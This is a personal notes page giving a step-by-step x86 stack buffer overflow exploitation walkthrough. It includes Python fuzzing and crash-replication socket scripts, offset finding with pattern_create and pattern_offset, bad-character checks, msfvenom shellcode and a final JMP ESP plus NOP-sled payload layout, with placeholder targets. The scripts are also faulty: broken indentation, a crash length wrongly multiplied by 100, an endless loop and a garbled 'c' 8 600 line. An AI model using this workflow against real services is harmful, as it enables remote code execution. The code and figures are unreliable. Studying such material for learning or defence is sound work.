---
layout: page
title: Detailed Steps
permalink: /notes/security/BufferOverflow/detailed-steps
notes_section: Security
notes_category: Buffer Overflow
notes_label: Detailed Steps
notes_order: 3
---

1. **Fuzzing**
	Write a python program to test and crash the application. Then note down the application's threshold.		```
	```
	import socket
	import sys

	buffer = "A"*100

	while True:
	try:
		s=socket.socket()
		s.connect(("<target IP>", <target port>))
		print("Connected to the target")
		s.recv(1024)
		print'[*]Sending buffer with length: ' + str(len(buffer))
		s.send(buffer+'\r\n')
		s.close()
		buffer=buffer+'A'*20
	except:
		print'[*]Crashed at buffer length : ' + str(len(buffer)*100)
		sys.exit()
	```

2. Replicating the crash
	Send the exact no.of bytes at which the application crashed to the application.
	```
	import socket
	import sys

	buffer = "A" * <the value at which the application crashed>
	while True:
	try:
		s=socket.socket()
		s.connect(("<target IP>", <target port>))
		print("Connected to the target")
		s.recv(1024)
		print'[*]Sending buffer with length: ' + str(len(buffer))
		s.send(buffer+'\r\n')
		s.close()
	except:
		print'[*]Crash confirmed at buffer length : ' + str(len(buffer)*100)
		sys.exit()
	```

3. Generate random characters using pattern_create.rb script. It requires -l value. Here, the -l value is the no.of bytes at which the application crashed.
	```/path/to/pattern_create.rb -l <crash confirmed value>```

4.  Send the generated pattern as buffer to the target machine/application
	```
	import socket
	import sys

	buffer = <generated pattern in double quotes>
	while True:
	try:
		s=socket.socket()
		s.connect(("<target IP>", <target port>))
		print("Connected to the target")
		s.recv(1024)
		print'[*]Sending the pattern of length: ' + str(len(buffer))
		s.send(buffer+'\r\n')
		s.close()
	except:
		print'[*]Crash confirmed at : ' + str(len(buffer)*100)
		sys.exit()
	```

5. Observe that EIP registers value is changed. Note down that value.
6. Use pattern_offset.rb to find the exact offset of EIP register. It requires -l and -q. -l is the no.of bytes sent and -q is the recently noted EIP value.
7. Now, we have the exact offset of EIP register. If exact offset is 524 for example, send 524 A's and some extra characters to verify the exact offset of the EIP registers.
8. Identify the bad characters of the application by sending some bad characters via the buffer using python
9. Generate a shellcode using msfvenom, while generating, remove the badchars from the shellcode using -b flag. Mention the bad chars in between the apostrophe's. 
10. Identify the jmpesp's memory address. Note down the memory address. Now write the memory address in little endian.
11. For example, if jmpesp's memory is 311712F3, write it as 
		\xf3\x12\x17\x31
12. Little endian is used because x86 architecture understands little endian. send this along with the buffer to the target i.e.,
		"A"*524 +\xf3\x12\x17\x31 + "c" 8 600
13.  Add few NOPs, note down the shell code size, subtract the no.of NOPs added and the size of shellcode from the no.of c's
14. Final payload format should be something like,
		payload= "A"*exact offset + <jmpesp value written in little endian> + "\x90"* 4/8/12/16 + <shellcode> + "c" * 100/200/300/400
